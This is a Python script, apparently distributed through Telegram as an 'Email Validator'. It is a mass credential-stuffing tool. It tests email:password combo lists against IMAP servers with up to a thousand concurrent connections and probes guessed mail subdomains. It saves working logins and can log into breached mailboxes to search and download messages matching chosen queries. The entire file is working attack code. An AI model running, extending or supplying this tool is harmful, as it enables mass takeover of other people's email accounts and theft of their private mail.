#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Check Python version - Python 2 is NOT supported
import sys
if sys.version_info < (3, 0):
    print("=" * 60)
    print("ERROR: This script requires Python 3.x or higher")
    print("Python 2.x is NOT supported and will NOT work!")
    print("=" * 60)
    print("Current Python version: {}".format(sys.version))
    print("Please use 'python3' command instead of 'python'")
    print("=" * 60)
    sys.exit(1)

import os
import time
from timeit import default_timer as timer
from datetime import datetime
import imaplib
import itertools
import argparse
import signal
import socket
import email
import errno
import hashlib

import gevent  # pip install gevent
from gevent.queue import *
from gevent.event import Event
import gevent.monkey


def sub_worker(t):
    if evt.is_set():
        send_sentinals()
        return
    q_status.put(t[1])  # send status
    task = t[0].split(':')
    #-----------------------------------
    host = get_imapConfig(task[0])
    if not host:
        if scan_unknow_host:
            host = ini_uh(task[0])
        if not host:
            if invunma:
                q_unmatched.put(t[0])  # send unmatched to q
            return
    #-----------------------------------
    l = imap(task[0], task[1], host)
    if l == 'OK':
        q_valid.put(t[0])  # send valid to q
        q_status.put("VeryTrue")  # put True in q for progressbar
        #.........................
        if grabactiv:
            task = grabberwrap(task, host)
            return
    #----------------------------------
    # If not OK (False, "Error", or any other value) -> invalid
    if l != 'OK':
        if invunma:
            q_invalid.put(t[0])  # send to write to disk
        return

# main consumer thread


def worker(worker_id):
    try:
        while not evt.is_set():
            t = q.get(block=True, timeout=2)
            sub_worker(t)
        send_sentinals()
    except BaseException:
        send_sentinals()

#-----------------WRAPPERS-------------------------#

# Gets message and forwards to queue


def grabberwrap(task, host):
    for q in loaded_matchers:
        try:
            e = email_grabber(task[0], task[1], host, q)
            qd = q.split('|')[2].strip()
            if len(e):
                # print "Found",len(e),"messages."
                for mail in e:
                    q_grabbed.put((task, str(mail), qd))
        except BaseException:
            pass


#/-----------------WRAPPERS-------------------------#

#-----------------IMAP-------------------------#

# login via imap_ssl, uses imap query on all inboxes, returns emails
def email_grabber(a, b, host, q):
    if len(host) < 2:
        port = 993
    else:
        port = int(host[1])
    socket.setdefaulttimeout(time_out)
    quer = q.split('|')[0].strip()
    query = q.split('|')[1].strip()
    mail = imaplib.IMAP4_SSL(host[0], port)
    mail.login(a, b)
    rv, mailbox = mail.list()
    messages = []
    try:
        inboxes = [box.split(' ')[-1].replace('"', '') for box in mailbox
                   if box.split(' ')[-1].replace('"', '')[0].isalpha()]
    except BaseException:
        return []
    if len(inboxes) < 1:
        return
    for inbox in inboxes:
        try:
            # print inbox
            rv, data = mail.select(inbox)
            if rv == 'OK':
                result, data = mail.uid(quer, None, query)
                if data and data[0]:
                    uids_data = data[0]
                    if isinstance(uids_data, bytes):
                        uids_data = uids_data.decode('utf-8')
                    for uids in uids_data.split():
                        rv, email_data = mail.uid('fetch', uids, '(RFC822)')
                        if rv != 'OK':
                            continue
                        raw_email = email_data[0][1]
                        if isinstance(raw_email, bytes):
                            email_message = email.message_from_bytes(raw_email)
                        else:
                            email_message = email.message_from_string(raw_email)
                        messages.append(str(email_message))
                        if grabb_perfor:
                            if len(messages) > 0:
                                return messages

                    #for part in email_message.walk():
                        #if part.get_content_type() == "text/plain":  # ignore attachments/html
                            #body = part.get_payload(decode=True)
                            #messages.append(str(body))
                            #if grabb_perfor:
                                #if len(messages>0):
                                    #return messages

                        #else:
                            #continue
        except BaseException:
            pass
    return messages

# log in via imap_ssl, gives back true if valid


def imap(usr, pw, host):
    socket.setdefaulttimeout(time_out)
    usr = usr.lower()
    try:
        if len(host) < 2:
            port = 993
        else:
            port = int(host[1])
        mail = imaplib.IMAP4_SSL(str(host[0]), port)
        a = str(mail.login(usr, pw))
        return a[2: 4]
    except imaplib.IMAP4.error:
        return False
    except BaseException:
        return "Error"

#/-----------------IMAP-------------------------#


#------GETUNKNOWN--HOST--------------------------#
def getunknown_imap(subb):
    socket.setdefaulttimeout(time_out)
    try:
        sub = [
            'imap',
            'mail',
            'pop',
            'pop3',
            'imap-mail',
            'inbound',
            'mx',
            'imaps',
            'smtp',
            'm']
        for host in sub:
            host = host + '.' + subb
            try:
                # Test connection without login to discover IMAP host
                mail = imaplib.IMAP4_SSL(str(host))
                mail.logout()
                return host
            except (imaplib.IMAP4.error, socket.error, Exception):
                continue
    except BaseException:
        return None


def ini_uh(host):
    try:
        host = host.split('@')[1]
        v = getunknown_imap(host)
        if v is not None:
            with open("hoster.dat", "a", encoding='utf-8') as myfile:
                myfile.write('\n' + host + ':' + v + ":993")
                ImapConfig[host] = v
            return v
        return False
    except BaseException:
        return False

#/------GETUNKNOWN--HOST--------------------------#

#---------------HELPERS-------------------------#


def make_sure_path_exists(path):
    try:
        os.makedirs(path)
    except OSError as exception:
        if exception.errno != errno.EEXIST:
            raise

# gets imap setting from dic


def get_imapConfig(email):
    try:
        hoster = email.lower().split('@')[1]
        return ImapConfig[hoster]
    except BaseException:
        return False

# send sentinal values to writer queues


def send_sentinals():
    q_status.put("SENTINAL")
    q_valid.put("SENTINAL")
    if invunma:
        q_invalid.put("SENTINAL")
        q_unmatched.put("SENTINAL")
    if grabactiv:
        q_grabbed.put("SENTINAL")
    q_isp_sorter.put("SENTINAL")

# set event to trigger sential sending


def handler(signum, frame):
    print("\n[INFO]Shutting down gracefully (takes a while)")
    evt.set()

# read in blocks for better speed


def blocks(files, size=65536):
    while True:
        b = files.read(size)
        if not b:
            break
        yield b


def transform(expression):
    # Python 3 compatibility: compiler module removed
    # This function may not be used, but kept for compatibility
    if hasattr(expression, 'node'):
        return transform(expression.node)
    elif isinstance(expression, tuple):
        return tuple(transform(item) for item in expression)
    elif isinstance(expression, (str, int, float, bool, type(None))):
        return expression
    else:
        return str(expression) if expression != 'NIL' else None

# get last line value from file generated when shutting down


def get_lastline():
    try:
        with open("last_line.log", "r", encoding='utf-8') as text_file:
            for line in text_file:
                if int(line.strip()) < 1:
                    return 0
                else:
                    return int(line.strip())
    except BaseException:
        return 0

#/---------------HELPERS-------------------------#

#-----------LOADERS------------------------------#

# loading lines from file, putting them into q


def loader():
    try:
        global par1
        par1 = 0
        if resumer:
            par1 = get_lastline()
        
        # Clean input file - remove invalid lines
        cleaned_lines = []
        removed_count = 0
        with open(file_in, "r", encoding='utf-8', errors='ignore') as text_file:
            for line_num, line in enumerate(text_file, 1):
                l = line.strip()
                if not l:  # Skip empty lines
                    continue
                
                # Check if format is email@domain.com:password or email@domain.com
                ll = l.split(':')
                email_part = ll[0] if ll else ""
                
                # Validate email format strictly
                is_valid = False
                if '@' in email_part and len(email_part) > 3:
                    la = email_part.split('@')
                    if len(la) == 2:
                        email_user = la[0].strip()
                        email_domain = la[1].strip()
                        
                        # Check email user and domain are not empty
                        if len(email_user) > 0 and len(email_domain) > 0:
                            domain_parts = email_domain.split('.')
                            # Must have at least domain.tld (2 parts minimum)
                            if len(domain_parts) >= 2 and all(len(part) > 0 for part in domain_parts):
                                # Accept only:
                                # 1. email@domain.com:password (exactly one colon)
                                # 2. email@domain.com (no colon)
                                if len(ll) == 2 and len(ll[1]) > 0:
                                    # Format: email@domain.com:password
                                    is_valid = True
                                elif len(ll) == 1:
                                    # Format: email@domain.com (no password)
                                    is_valid = True
                
                if is_valid:
                    cleaned_lines.append(l)
                else:
                    removed_count += 1
        
        # Write cleaned lines back to file
        if removed_count > 0:
            print("[INFO] Removed {} invalid line(s) from {}".format(removed_count, file_in))
        with open(file_in, "w", encoding='utf-8') as f:
            for line in cleaned_lines:
                f.write(line + "\n")
        
        # Load cleaned lines into queue
        with open(file_in, "r", encoding='utf-8') as text_file:
            pid = par1
            for line in itertools.islice(text_file, par1, None):
                l = line.strip()
                if len(l) > 2:
                    ll = l.split(':')
                    if len(ll) < 3 and len(ll) > 0:
                        email_part = ll[0]
                        if '@' in email_part:
                            la = email_part.split('@')
                            if len(la) == 2 and len(la[0]) > 0 and len(la[1]) > 0:
                                domain_parts = la[1].split('.')
                                if len(domain_parts) >= 2:
                                    # If no password, add empty password
                                    if len(ll) == 1:
                                        l = l + ":"
                                    q.put((l, pid))
                                    pid = pid + 1

    except IOError:
        print("[ERROR]No input file", file_in, "found!")
    except BaseException:
        pass


# load imap queries from file #Yes, its racy and nobody cares ;-)
def init_matchers():
    global loaded_matchers, grabactiv
    loaded_matchers = []
    try:
        with open(file_match, "r", encoding='utf-8') as text_file:
            loaded_matchers = [line.strip() for line in text_file
                               if len(line.strip()) > 1]
            if len(loaded_matchers) < 1:
                print("No matchers in", file_match)
                grabactiv = False

    except BaseException:
        print("[ERROR] Could not load any matchers, no file provided.")

# load Imap settings from file


def init_ImapConfig():
    global ImapConfig
    ImapConfig = {}
    try:
        with open("hoster.dat", "r", encoding='utf-8', errors='ignore') as f:
            for line in f:
                if len(line) > 1:
                    try:
                        hoster = line.strip().split(':')
                        if len(hoster) >= 3:
                            ImapConfig[hoster[0]] = (hoster[1], hoster[2])
                    except:
                        continue
    except BaseException as e:
        print("[ERROR] hoster.dat not found or error:", str(e))

#/-----------LOADERS------------------------------#

#---------------WRITERS---------------------------#

# writing valid lines to disk


def writer_valid():
    try:
        global timestamp_output_folder
        valid_path = os.path.join(timestamp_output_folder, "mail_pass_valid.txt")
        # Folder for emails with passwords (valid only)
        valid_with_pass_folder = os.path.join(timestamp_output_folder, "valid_with_passwords")
        make_sure_path_exists(valid_with_pass_folder)
        valid_with_pass_path = os.path.join(valid_with_pass_folder, "mail_pass_valid_with_password.txt")
        
        with open(valid_path, "a", encoding='utf-8') as f, open(valid_with_pass_path, "a", encoding='utf-8') as f_pass:
            sen_count = workers
            while True:
                t = q_valid.get(block=True)
                if t == "SENTINAL":
                    sen_count -= 1
                    if sen_count < 1:
                        break
                else:
                    # t is the full line (email:password or email:)
                    email_line = str(t).strip()
                    
                    # Extract email only (without password)
                    if ':' in email_line:
                        email_only = email_line.split(':')[0]
                    else:
                        email_only = email_line
                    
                    # Write email only to mail_pass_valid.txt
                    f.write(email_only + "\n")
                    f.flush()
                    
                    # Write full email:password to valid_with_passwords folder
                    # Only write if password exists (not just email:)
                    if ':' in email_line and len(email_line.split(':', 1)[1]) > 0:
                        f_pass.write(email_line + "\n")
                    else:
                        # If no password, write email only
                        f_pass.write(email_only + "\n")
                    f_pass.flush()
                    
                    # Also send email only to ISP/boite sorter
                    q_isp_sorter.put(email_only)
    except BaseException:
        pass

# writing invalid lines to disk


def writer_invalid():
    if invunma:
        try:
            global timestamp_output_folder
            invalid_path = os.path.join(timestamp_output_folder, "mail_pass_invalid.txt")
            with open(invalid_path, "a", encoding='utf-8') as f:
                sen_count = workers
                while True:
                    t = q_invalid.get(block=True)
                    if t == "SENTINAL":
                        sen_count -= 1
                        if sen_count < 1:
                            break
                    else:
                        # Extract email only (without password)
                        email_line = str(t)
                        if ':' in email_line:
                            email_only = email_line.split(':')[0]
                        else:
                            email_only = email_line
                        f.write(email_only + "\n")
        except BaseException:
            pass

# writing unmachted lines to disk (disabled - not saving to file)


def writer_unmatched():
    if invunma:
        try:
            sen_count = workers
            while True:
                t = q_unmatched.get(block=True)
                if t == "SENTINAL":
                    sen_count -= 1
                    if sen_count < 1:
                        break
                # Not writing to file anymore
        except BaseException:
            pass

# writing emails sorted by ISP/boite


def writer_isp_sorter():
    try:
        make_sure_path_exists("isp+boite")
        isp_files = {}  # Dictionary to store file handles for each ISP/boite
        sen_count = workers  # One sentinel per worker thread
        while True:
            t = q_isp_sorter.get(block=True)
            if t == "SENTINAL":
                sen_count -= 1
                if sen_count < 1:
                    # Close all file handles
                    for f in isp_files.values():
                        f.close()
                    break
            else:
                # Extract ISP/boite from email (part after @)
                try:
                    email_line = str(t)
                    if ':' in email_line:
                        email_part = email_line.split(':')[0]
                    else:
                        email_part = email_line
                    
                    if '@' in email_part:
                        isp_boite = email_part.split('@')[1].strip().lower()
                        # Create filename for this ISP/boite
                        filename = os.path.join("isp+boite", "mail_{}.txt".format(isp_boite))
                        
                        # Open file if not already open
                        if filename not in isp_files:
                            isp_files[filename] = open(filename, "a", encoding='utf-8')
                        
                        # Write email only (without password)
                        isp_files[filename].write(email_part + "\n")
                        isp_files[filename].flush()  # Ensure data is written
                except BaseException:
                    pass
    except BaseException:
        pass

# writing grabbed emails to disk


def writer_grabber():
    if grabactiv:
        try:
            sen_count = workers
            while True:
                t = q_grabbed.get(block=True)
                if t == "SENTINAL":
                    sen_count -= 1
                    if sen_count < 1:
                        break
                else:
                    with open((file_in[:-4]+"_grabbed_" +str(t[2]) + ".txt"), "a", encoding='utf-8') as ff:
                              ff.write(str(t[0][0])+":"+str(t[0][1])+"\n")
                    if grabb_perfor == False:
                        path = "grabbed_"+file_in[:-4]+"/"+str(t[2])+"/"+str(t[0])+"/"
                        make_sure_path_exists(path)
                        hash_object = hashlib.sha1(str(t[1]).encode('utf-8'))
                        hex_dig = hash_object.hexdigest()
                        with open(path+str(hex_dig)+".elp", "w", encoding='utf-8') as f:
                            f.write(str(t[1]))
        except BaseException:
            pass

# getting line count and interating progressbar with it
# writing last line to file


def state():
    sen_count = workers
    if not p_mode:
        with open(file_in, "r", encoding='utf-8') as f:
            line_max = sum(bl.count("\n") for bl in blocks(f))
        if par1 > line_max:
            first_line = line_max
        else:
            first_line = par1
    else:
        line_max = 99999999999999999  # pseudo inf.
    LastValue = {}
    valid_count = 0  # Counter for valid emails
    while True:
        t = q_status.get(block=True)
        if t == "SENTINAL":
            sen_count -= 1
            if sen_count < 1:
                # Store valid count in global variable
                global total_valid_count
                total_valid_count = valid_count
                try:
                    v = str(
                        int(max(LastValue.items(), key=lambda x: x[1])[1]) + 1)
                except BaseException:
                    break
                try:
                    with open("last_line.log", "w", encoding='utf-8') as f:
                        if line_max != par1:
                            f.write(v)
                except:
                    pass
                break
        else:
            if evt.is_set() is False:
                if t == "VeryTrue":
                    valid_count += 1  # Increment valid counter
            if t != "VeryTrue":
                LastValue[t] = t

#/---------------WRITERS---------------------------#


# gevent async logic, spawning consumer greenlets
def asynchronous():
    # Create timestamp folder once at start
    global timestamp_output_folder
    make_sure_path_exists("M-P-V-I")
    timestamp_folder = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    timestamp_output_folder = os.path.join("M-P-V-I", timestamp_folder)
    make_sure_path_exists(timestamp_output_folder)
    print("[INFO] Output folder: {}".format(timestamp_output_folder))
    
    threads = []
    threads.append(gevent.spawn(loader))
    for i in range(0, workers):
        threads.append(gevent.spawn(worker, i))
    threads.append(gevent.spawn(writer_valid))
    threads.append(gevent.spawn(writer_isp_sorter))
    threads.append(gevent.spawn(state))
    if invunma:
        threads.append(gevent.spawn(writer_invalid))
        threads.append(gevent.spawn(writer_unmatched))
    if grabactiv:
        threads.append(gevent.spawn(writer_grabber))
    start = timer()
    gevent.joinall(threads)
    end = timer()
    print("[INFO]Time elapsed: " + str(end - start)[:5], "seconds.")
    # Display valid count
    try:
        print("[INFO] Valid emails: {}".format(total_valid_count))
    except:
        print("[INFO] Valid emails: 0")
    print("[INFO] Done.")
    evt.set()  # cleaning up


# Set UTF-8 encoding for Windows console
if sys.platform == 'win32':
    try:
        sys.stdout.reconfigure(encoding='utf-8')
    except AttributeError:
        # Python < 3.7 or older Windows
        import codecs
        sys.stdout = codecs.getwriter('utf-8')(sys.stdout.buffer, 'strict')

print("""
╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║     ███████╗███╗   ███╗ █████╗ ██╗██╗     ██╗            ║
║     ██╔════╝████╗ ████║██╔══██╗██║██║     ██║            ║
║     █████╗  ██╔████╔██║███████║██║██║     ██║            ║
║     ██╔══╝  ██║╚██╔╝██║██╔══██║██║██║     ██║            ║
║     ███████╗██║ ╚═╝ ██║██║  ██║██║███████╗███████╗       ║
║     ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝       ║
║                                                           ║
║           ██╗   ██╗ █████╗ ██╗     ██╗██████╗            ║
║           ██║   ██║██╔══██╗██║     ██║██╔══██╗           ║
║           ██║   ██║███████║██║     ██║██║  ██║           ║
║           ╚██╗ ██╔╝██╔══██║██║     ██║██║  ██║           ║
║            ╚████╔╝ ██║  ██║███████╗██║██████╔╝           ║
║             ╚═══╝  ╚═╝  ╚═╝╚══════╝╚═╝╚═════╝            ║
║                                                           ║
║                  Email Validator v3.0                    ║
║                                                           ║
║                    Telegram: @werlist99                  ║
║                                                           ║
╚═══════════════════════════════════════════════════════════╝
""")
parser = argparse.ArgumentParser(description='Email Validator')
parser.add_argument(
    '-i',
    '--input',
    help="Inputfile",
    required=False,
    type=str,
    default="mail_pass.txt")
parser.add_argument(
    '-o',
    '--output',
    help='Outputfile',
    required=False,
    type=str,
    default="mail_pass_valid.txt")
parser.add_argument(
    '-t',
    '--threads',
    help='Number of Greenlets spawned',
    required=False,
    type=int,
    default="1000")
parser.add_argument(
    '-iu',
    '--invunma',
    help='Log invalid an unmatched accounts.',
    required=False,
    type=bool,
    default=True)
parser.add_argument(
    '-g',
    '--grabber',
    help='Grab for matchers.',
    required=False,
    type=bool,
    default=False)
parser.add_argument(
    '-ga',
    '--grabball',
    help='Grabball emails',
    required=False,
    type=bool,
    default=False)
parser.add_argument(
    '-mf',
    '--matchfile',
    help='File with matchers..',
    required=False,
    type=str,
    default="matchers.dat")
parser.add_argument(
    '-to',
    '--timeout',
    help='timeout in sec',
    required=False,
    type=float,
    default="5")
parser.add_argument(
    '-r',
    '--resume',
    help='Resume from last line?',
    required=False,
    type=bool,
    default=False)
# Progressbar will be initialized by counting \n in a file,
# if file to big its too costly to count, hence disable when needed
parser.add_argument(
    '-b',
    '--big',
    help='Performance mode for big files',
    required=False,
    type=bool,
    default=False)
parser.add_argument(
    '-uh',
    '--unknownhosts',
    help='Check for unknown hosts',
    required=False,
    type=bool,
    default=True)
parser.add_argument(
    '-gper',
    '--grabperformance',
    help='Grabs but does not save emails',
    required=False,
    type=bool,
    default=False)


# parsing arguments
args = vars(parser.parse_args())

file_in = args['input']
file_out = args['output']
workers = args['threads']
invunma = args['invunma']
grabactiv = args['grabber']
file_match = args['matchfile']
time_out = args['timeout']
resumer = args['resume']
p_mode = args['big']
scan_unknow_host = args["unknownhosts"]
grabb_all = args["grabball"]
grabb_perfor = args["grabperformance"]

# monkey patching libs which a supported by gevent

gevent.monkey.patch_all()

# registering an event and signal handler

evt = Event()
signal.signal(signal.SIGINT, handler)

# init ressources

init_ImapConfig()
if grabactiv:
    init_matchers()

# init of queues
# Global variable for timestamp output folder
timestamp_output_folder = None
# Global variable for valid count
total_valid_count = 0

q = gevent.queue.Queue(maxsize=250000)  # loader
q_valid = gevent.queue.Queue()  # valid
q_status = gevent.queue.Queue()  # status
q_isp_sorter = gevent.queue.Queue()  # ISP/boite sorter
if invunma:
    q_invalid = gevent.queue.Queue()  # invalid
    q_unmatched = gevent.queue.Queue()  # unmatched
if grabactiv:
    q_grabbed = gevent.queue.Queue()  # grabbed

# starting main logic

try:
    asynchronous()
except:
    pass
